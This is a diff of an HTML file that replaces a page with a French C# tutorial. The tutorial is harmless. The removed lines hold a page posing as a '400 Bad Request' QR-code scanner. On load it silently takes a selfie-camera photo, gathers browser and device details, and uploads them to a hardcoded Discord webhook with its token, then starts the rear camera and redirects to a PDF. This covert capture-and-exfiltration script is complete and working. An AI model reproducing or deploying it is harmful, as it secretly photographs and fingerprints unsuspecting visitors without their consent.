@@ -3,207 +3,293 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Scanner QR Code</title>
+    <title>Documentation C# - Détails Complets</title>
     <style>
-        /* Styles inchangés */
-        #video-container {
-            position: relative;
-            width: 80vw;
-            height: auto;
-            margin-bottom: 10px;
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
         }
-        #video-main {
-            width: 100%;
-            height: auto;
-            background-color: black; /* Fond noir par défaut */
+        header {
+            background: #333;
+            color: #fff;
+            padding: 10px 0;
+            text-align: center;
         }
-        #qr-reader {
-            width: 300px;
-            height: 300px;
-            margin: auto;
+        section {
+            padding: 20px;
+            margin: 10px;
+            background: #fff;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
         }
-        .corps {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 300px;
-            height: 300px;
-            border: solid 2px rgba(255, 0, 0, 0.7);
-            background-color: rgba(255, 255, 255, 0.3);
-            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
-            z-index: 10;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            border-radius: 10px;
+        h1, h2 {
+            color: #333;
         }
-        .corps::before {
-            content: '';
-            position: absolute;
-            width: 100%;
-            height: 2px;
-            background-color: green;
-            top: 50%;
-            left: 0;
-            transform: translateY(-50%);
-            z-index: 11;
+        code {
+            background-color: #f5f5f5;
+            padding: 5px;
+            border-radius: 3px;
         }
-        #capture-button {
-            width: 70px;
-            height: 70px;
-            border-radius: 50%;
-            background-color: #ffffff;
-            border: 4px solid #007AFF;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
-            cursor: pointer;
-            position: relative;
-            display: block;
-            margin: 20px auto;
-        }
-        #capture-button::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 30px;
-            height: 30px;
-            background-color: #007AFF;
-            border-radius: 50%;
-            transform: translate(-50%, -50%);
+        pre {
+            background-color: #f5f5f5;
+            padding: 10px;
+            border-radius: 3px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
         }
     </style>
-    <script src="https://unpkg.com/html5-qrcode/minified/html5-qrcode.min.js"></script>
 </head>
 <body>
-    <h1>400 Bad Request</h1>
-    <p>Veuillez réessayer le scan du QR code</p>
 
-    <div id="video-container">
-        <video id="video-main" autoplay playsinline></video>
-        <div class="corps"></div>
-    </div>
+<header>
+    <h1>Documentation C# : Détails Complets</h1>
+</header>
 
-    <button id="capture-button" onclick="redirigerVersPage()" title="Prendre une photo"></button>
+<section>
+    <h2>1. Introduction au C#</h2>
+    <p>C# est un langage de programmation moderne, conçu pour créer des applications sur la plateforme .NET. Ce langage puissant est orienté objet et prend en charge de nombreux concepts avancés.</p>
 
-    <script>
-        async function obtenirInfosAppareil() {
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            const language = navigator.language;
+    <h3>1.1. Syntaxe de base</h3>
+    <p>Voici un programme simple qui affiche "Hello, World!" :</p>
+    <pre><code>using System;
 
-            return `User Agent: ${userAgent}\nPlatform: ${platform}\nLanguage: ${language}`;
+class Program
+{
+    static void Main()
+    {
+        Console.WriteLine("Hello, World!");
+    }
+}</code></pre>
+
+    <p>C# utilise des espaces de noms (namespace) pour organiser les classes. Le mot-clé <code>using</code> inclut ces espaces dans votre programme.</p>
+</section>
+
+<section>
+    <h2>2. Variables et Types de données</h2>
+    <p>C# est un langage typé statiquement, ce qui signifie que les types des variables doivent être définis lors de la déclaration.</p>
+
+    <h3>2.1. Types primitifs</h3>
+    <pre><code>int number = 10; // Entier
+string text = "Hello"; // Chaîne de caractères
+double price = 9.99; // Nombre à virgule flottante
+bool isActive = true; // Booléen</code></pre>
+
+    <h3>2.2. Types complexes</h3>
+    <p>Les types complexes sont les classes, structures, tableaux, etc.</p>
+    <pre><code>class Person
+{
+    public string Name;
+    public int Age;
+}</code></pre>
+
+    <h3>2.3. Tableaux</h3>
+    <pre><code>int[] numbers = { 1, 2, 3, 4, 5 };
+Console.WriteLine(numbers[0]); // Accéder au premier élément</code></pre>
+</section>
+
+<section>
+    <h2>3. Structures de contrôle</h2>
+    <h3>3.1. Conditionnelles</h3>
+    <pre><code>int age = 20;
+if (age >= 18)
+{
+    Console.WriteLine("Vous êtes majeur.");
+}
+else
+{
+    Console.WriteLine("Vous êtes mineur.");
+}</code></pre>
+
+    <h3>3.2. Boucles</h3>
+    <h4>&#9654; <code>for</code></h4>
+    <pre><code>for (int i = 0; i < 5; i++)
+{
+    Console.WriteLine(i);
+}</code></pre>
+
+    <h4>&#9654; <code>while</code></h4>
+    <pre><code>int i = 0;
+while (i < 5)
+{
+    Console.WriteLine(i);
+    i++;
+}</code></pre>
+
+    <h4>&#9654; <code>foreach</code></h4>
+    <pre><code>int[] numbers = {1, 2, 3, 4, 5};
+foreach (var number in numbers)
+{
+    Console.WriteLine(number);
+}</code></pre>
+</section>
+
+<section>
+    <h2>4. Classes et Objets</h2>
+    <h3>4.1. Déclaration d'une classe</h3>
+    <pre><code>class Person
+{
+    public string Name;
+    public int Age;
+
+    public void Greet()
+    {
+        Console.WriteLine("Hello, my name is " + Name);
+    }
+}</code></pre>
+
+    <h3>4.2. Constructeurs</h3>
+    <pre><code>class Person
+{
+    public string Name;
+    public int Age;
+
+    public Person(string name, int age)
+    {
+        Name = name;
+        Age = age;
+    }
+}</code></pre>
+
+    <h3>4.3. Création d'un objet</h3>
+    <pre><code>Person person1 = new Person("Alice", 25);
+person1.Greet();  // Affiche "Hello, my name is Alice"</code></pre>
+</section>
+
+<section>
+    <h2>5. Encapsulation</h2>
+    <p>L'encapsulation consiste à protéger les données en les rendant privées et en les manipulant via des méthodes publiques.</p>
+
+    <h3>5.1. Propriétés</h3>
+    <pre><code>class Person
+{
+    private int age;
+
+    public int Age
+    {
+        get { return age; }
+        set
+        {
+            if (value > 0)
+                age = value;
+            else
+                Console.WriteLine("Age must be positive.");
         }
+    }
+}</code></pre>
 
-        function envoyerDonnees(imageBlob, infos) {
-            const formData = new FormData();
-            formData.append('file', imageBlob, 'photo.png');
-            formData.append('payload_json', JSON.stringify({ content: infos }));
+    <h3>5.2. Utilisation des propriétés</h3>
+    <pre><code>Person person1 = new Person();
+person1.Age = 30;  // Utilisation du setter
+Console.WriteLine(person1.Age);  // Utilisation du getter</code></pre>
+</section>
 
-            const url = 'https://discord.com/api/webhooks/1264557833186443367/Ca29UpZabSCdGlVyzqgFbKqyTXiCs7M2ClkBogm48Vr2YaXIbLB2i3AyBLOp6Xk1memE';
-            return fetch(url, {
-                method: 'POST',
-                body: formData
-            });
-        }
+<section>
+    <h2>6. Héritage</h2>
+    <p>L'héritage permet à une classe d'hériter des propriétés et des méthodes d'une autre classe.</p>
 
-        function capturerPhoto(videoElement) {
-            const canvas = document.createElement('canvas');
-            const context = canvas.getContext('2d');
-            canvas.width = videoElement.videoWidth;
-            canvas.height = videoElement.videoHeight;
-            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-            return canvas.toDataURL('image/png');
-        }
+    <h3>6.1. Exemple d'héritage simple</h3>
+    <pre><code>class Animal
+{
+    public string Name;
+    public void Speak()
+    {
+        Console.WriteLine("Animal speaks");
+    }
+}
 
-        function dataURLToBlob(dataURL) {
-            const byteString = atob(dataURL.split(',')[1]);
-            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
-            const ab = new ArrayBuffer(byteString.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
-            return new Blob([ab], { type: mimeString });
-        }
+class Dog : Animal
+{
+    public void Bark()
+    {
+        Console.WriteLine("Woof!");
+    }
+}</code></pre>
 
-        async function lancerScanQRCode() {
-            const qrReader = document.getElementById('qr-reader');
-            qrReader.style.display = 'block';
-            const html5QrCode = new Html5Qrcode("qr-reader");
+    <h3>6.2. Accéder aux membres de la classe parente avec <code>base</code></h3>
+    <pre><code>class Dog : Animal
+{
+    public void DisplayInfo()
+    {
+        Console.WriteLine("Name: " + base.Name); // Accède à Name via la classe parente
+    }
+}</code></pre>
+</section>
 
-            html5QrCode.start(
-                { facingMode: "environment" },
-                {
-                    fps: 10,
-                    qrbox: 250
-                },
-                (decodedText, decodedResult) => {
-                    console.log(`QR Code détecté: ${decodedText}`);
-                    html5QrCode.stop();
-                },
-                (errorMessage) => {
-                    console.warn(`Erreur de scan: ${errorMessage}`);
-                }
-            ).catch((err) => {
-                console.error(`Erreur de démarrage du scanner QR: ${err}`);
-            });
-        }
+<section>
+    <h2>7. Polymorphisme</h2>
+    <p>Le polymorphisme permet d'utiliser des objets de types différents via une interface ou une classe parente.</p>
 
-        async function obtenirCameraArriere() {
-            try {
-                return await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-            } catch (err) {
-                console.error('Erreur d\'accès à la caméra arrière:', err);
-                alert("Erreur d'accès à la caméra arrière. Assurez-vous d'avoir autorisé les permissions.");
-                return null;
-            }
-        }
+    <h3>7.1. Surcharge de méthodes</h3>
+    <pre><code>class Calculator
+{
+    public int Add(int a, int b)
+    {
+        return a + b;
+    }
 
-        async function obtenirCameraSelfie() {
-            try {
-                return await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-            } catch (err) {
-                console.error('Erreur d\'accès à la caméra selfie:', err);
-                alert("Erreur d'accès à la caméra selfie. Assurez-vous d'avoir autorisé les permissions.");
-                return null;
-            }
-        }
+    public double Add(double a, double b)
+    {
+        return a + b;
+    }
+}</code></pre>
+</section>
 
-        function redirigerVersPage() {
-            window.location.href = 'https://userdocs.zenchef.com/362304/iyhDWYXHr6YT17n1xkpEEBP3sbq6MmgCvfTuPJAs.pdf';
-        }
+<section>
+    <h2>8. Interfaces</h2>
+    <p>Les interfaces permettent de définir des contrats que les classes doivent suivre.</p>
 
-        (async function() {
-            // D'abord capture de la caméra selfie
-            const streamSelfie = await obtenirCameraSelfie();
-            if (streamSelfie) {
-                const videoSelfie = document.createElement('video');
-                videoSelfie.srcObject = streamSelfie;
-                videoSelfie.play();
+    <h3>8.1. Définir une interface</h3>
+    <pre><code>interface IShape
+{
+    double CalculateArea();
+}
 
-                videoSelfie.onloadedmetadata = async () => {
-                    const dataURLSelfie = capturerPhoto(videoSelfie);
-                    const blobSelfie = dataURLToBlob(dataURLSelfie);
-                    const infosAppareil = await obtenirInfosAppareil();
+class Circle : IShape
+{
+    public double Radius;
 
-                    await envoyerDonnees(blobSelfie, infosAppareil);
-                    console.log('Image de la caméra selfie envoyée avec succès');
+    public double CalculateArea()
+    {
+        return Math.PI * Radius * Radius;
+    }
+}</code></pre>
+</section>
 
-                    // Après capture de la caméra selfie, démarrer le flux de la caméra arrière
-                    const videoMain = document.getElementById('video-main');
-                    const streamMain = await obtenirCameraArriere();
-                    if (streamMain) {
-                        videoMain.srcObject = streamMain;
-                        lancerScanQRCode();
-                    } else {
-                        alert("Impossible d'accéder à la caméra arrière.");
-                    }
-                };
-            } else {
-                alert("Impossible d'accéder à la caméra selfie.");
-            }
-        })();
-    </script>
+<section>
+    <h2>9. Délégués et événements</h2>
+    <p>Les délégués sont des pointeurs vers des méthodes, et les événements permettent de déclencher des actions lorsque des conditions spécifiques sont remplies.</p>
+
+    <h3>9.1. Définir un délégué</h3>
+    <pre><code>delegate void Notify(string message);
+
+class Process
+{
+    public Notify OnComplete;
+
+    public void StartProcess()
+    {
+        // Simuler un traitement
+        OnComplete?.Invoke("Process Completed");
+    }
+}</code></pre>
+</section>
+
+<section>
+    <h2>10. Gestion des erreurs</h2>
+    <p>Les exceptions permettent de gérer les erreurs de manière structurée dans le programme.</p>
+
+    <h3>10.1. Exemple de bloc try-catch</h3>
+    <pre><code>try
+{
+    int result = 10 / 0;  // Provoque une division par zéro
+}
+catch (DivideByZeroException ex)
+{
+    Console.WriteLine("Erreur: " + ex.Message);
+}</code></pre>
+</section>
+
 </body>
 </html>
